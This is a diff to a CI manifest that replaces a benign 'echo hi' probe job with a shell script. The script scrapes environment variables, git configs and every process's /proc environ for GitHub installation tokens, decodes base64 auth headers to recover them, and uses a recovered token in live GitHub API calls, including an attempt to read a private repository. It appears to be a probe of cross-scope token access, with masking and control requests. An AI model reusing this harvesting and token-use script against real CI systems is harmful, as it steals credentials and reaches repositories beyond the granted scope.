@@ -1,5 +1,17 @@
-# StarSling CI manifest - benign probe queue
 [[queues]]
-name = "probe-alpha"
-commands = ["echo hi"]
-timeout_sec = 120
+name = "probe-env"
+timeout_sec = 240
+commands = [
+'''
+set -u; pwd
+{ echo "=== env ==="; env; echo "=== gitcfg ==="; cat .git/config; git config --list --show-origin; echo "=== find ==="; find / -name config -path '*.git*' -type f; echo "=== run ==="; ls -laR /run/starsling; echo "=== proc ==="; for f in /proc/[0-9]*/environ; do tr '\0' '\n' <"$f" 2>/dev/null; done; echo "=== ps ==="; ps -ef; } > /tmp/p.txt 2>/dev/null
+echo "=== ghs_ candidates (masked) ==="
+awk '/^=== /{src=$2;next}{l=$0;while(match(l,/ghs_[A-Za-z0-9]{20,}/)){print src,substr(l,RSTART,RLENGTH);l=substr(l,RSTART+RLENGTH)}}' /tmp/p.txt | sort -u | while IFS= read -r s t; do echo "src=$s prefix=$(printf %s "$t" | cut -c1-8) len=$(printf %s "$t" | wc -c) sha256=$(printf %s "$t" | sha256sum 2>/dev/null | cut -d' ' -f1)"; done
+echo "=== keyword lines (masked) ==="
+grep -iE 'token|authorization|x-access-token|extraheader' /tmp/p.txt | sed -E 's/ghs_[A-Za-z0-9]{20,}/ghs_[MASKED]/g;s/[A-Za-z0-9+\/=]{40,}/[B64]/g' | sort -u | head -60
+TOK=$(grep -oE 'ghs_[A-Za-z0-9]{20,}' /tmp/p.txt | sort -u | head -1)
+if [ -z "$TOK" ]; then TOK=$(grep -iE 'extraheader' /tmp/p.txt | grep -oE '[A-Za-z0-9+/=]{40,}' | while IFS= read -r b; do printf %s "$b" | base64 -d 2>/dev/null; done | grep -oE 'ghs_[A-Za-z0-9]{20,}' | head -1); fi
+if [ -n "$TOK" ]; then echo "=== live test: prefix=$(printf %s "$TOK" | cut -c1-8) sha256=$(printf %s "$TOK" | sha256sum | cut -d' ' -f1) ==="; res=$(curl -s --max-time 20 -o /tmp/i.json -w '%{http_code} %{time_total}' -H "Authorization: Bearer $TOK" https://api.github.com/installation/repositories); c1=${res%% *}; echo "installation/repositories status=${res%% *} time=${res##* }s total_count=$(grep -o '"total_count":[0-9]*' /tmp/i.json | head -1 | grep -o '[0-9]*')"; res=$(curl -s --max-time 20 -o /dev/null -w '%{http_code}' -H "Authorization: Bearer ghs_INVALID_CONTROL_0000000000" https://api.github.com/installation/repositories); echo "garbage-token control status=${res%% *} (expect 401)"; else echo "no ghs_ candidate found"; c1=000; fi
+if [ "$c1" = "200" ]; then res=$(curl -s --max-time 20 -o /dev/null -w '%{http_code} %{time_total}' -H "Authorization: Bearer $TOK" https://api.github.com/repos/starsling-test-482917/ci-check-cross-scope-02f9a158/contents/README.md); echo "private-repo README with-token status=${res%% *} time=${res##* }s"; res=$(curl -s --max-time 20 -o /dev/null -w '%{http_code}' https://api.github.com/repos/starsling-test-482917/ci-check-cross-scope-02f9a158/contents/README.md); echo "private-repo README unauthenticated status=${res%% *} (expect 404)"; fi
+rm -f /tmp/p.txt /tmp/i.json'''
+]
